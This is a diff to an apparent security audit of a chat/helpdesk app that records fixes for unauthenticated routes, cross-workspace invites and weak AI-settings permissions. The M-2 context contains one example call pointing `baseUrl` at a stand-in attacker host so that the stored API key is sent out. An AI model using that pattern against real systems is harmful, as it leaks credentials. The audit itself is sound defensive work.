@@ -56,6 +56,7 @@ The application-level guards (`assertAdminUser`, `assertAgent`, `assertSuperAdmi
 - **Fix:** add a `BEFORE UPDATE/INSERT` trigger that rejects changes to `workspace_id` and `role` unless the caller is service-role or an admin of the target workspace. Move team changes exclusively into server actions. Stop creating agents with `role: 'owner'` on the client.
 
 ### H-5: Unauthenticated API routes act on arbitrary workspaces and conversations
+> **Partly fixed** by the teams-and-roles change: every agent-facing route below now calls `guardConversation` / `guardWorkspace` / `guardMember` (`src/lib/team/route-guard.ts`) and runs through the caller's session where it can; `smtp/save`, `ai/suggest` and `conversations/search` were deleted; `auto-close` needs a workspace and edit rights; `GET /snooze` and `unread-notifications` need `CRON_SECRET` (or a signed-in member for the latter); the bot's handover calls the auto-assign function directly instead of fetching the route. Still open: widget-facing routes (`ai/auto-respond`, `upload*`, `visitor/geo`, `tracking`, `help/*`), `agent/webhook`, `cron/verify-domains`, and `/api/channels/*` inbound webhooks.
 None of these routes checks a session, a secret or membership. The ones that use `serviceClient()` bypass RLS entirely, and the rest rely on the anon policies from H-3.
 
 | Route | Client | What an anonymous caller can do |
@@ -91,6 +92,7 @@ None of these routes checks a session, a secret or membership. The ones that use
 - **Fix:** escape quotes in `formatMarkdownToHtml`, or render through `formatChatMarkdown`, which escapes everything first. Build attribute-bearing elements with `document.createElement` plus `setAttribute`, and validate URL schemes. Then rebuild `public/widget.js`.
 
 ### H-8: Inviting a user silently moves them out of their current workspace
+> **Fixed:** the old `inviteAgentAction`, `updateAgentRoleAction` and `removeAgentAction` are gone. `inviteMemberAction` (`src/app/actions/team.ts`) refuses anyone who already works in another workspace, and role/deactivation changes go through database functions that refuse cross-workspace targets.
 - **Where:** `inviteAgentAction` (`src/app/actions/admin.ts`), which upserts `agents` on `id` with the inviter's `workspace_id`. `findOrCreateOwnerAgent` and `createWorkspaceAction` behave the same way.
 - **Impact:** an admin of workspace A can invite the owner or agents of workspace B by email and pull them out of B, with role `admin` if they like. B loses its team, and the moved users now see A. Agents can belong to only one workspace, so this is destructive.
 - **Fix:** refuse to invite a user who already has a different `workspace_id`, or move to a `workspace_members` join table with an accept step.
@@ -103,6 +105,7 @@ None of these routes checks a session, a secret or membership. The ones that use
 `workspaces.ai_settings.api_key` and `workspaces.smtp_settings.pass` live in the row that `dashboard/page.tsx`, `admin/page.tsx` and many actions fetch with `select('*')`, so they reach the client of every agent, not just admins. Store them in a separate table (or Supabase Vault) that only `service_role` can read, and return masked values to the UI.
 
 ### M-2: Non-admin agents can change AI settings and leak the API key
+> **Fixed for roles:** `saveAiProviderAction`, `testAiProviderAction` and `updateHelpTabSettingsAction` now need `manage_settings` (owner/admin), and light agents can't write help-centre or knowledge content. Still open: the host allow-list and never combining an override URL with the stored key.
 `saveAiProviderAction` and `testAiProviderAction` (`src/app/actions/knowledge.ts`) only call `assertAgent`, so any agent passes. `testAiProviderAction(ws, { baseUrl: 'https://attacker' })` sends the **stored** API key to an attacker-controlled URL, and `base_url` is otherwise unrestricted (SSRF). `updateHelpTabSettingsAction` (helpdesk.ts) is also an admin setting behind `assertAgent`. Fix: use `assertAdminUser`, allow-list provider hosts, and never combine an override URL with the stored key.
 
 ### M-3: SECURITY DEFINER RPCs callable by anon with no ownership checks
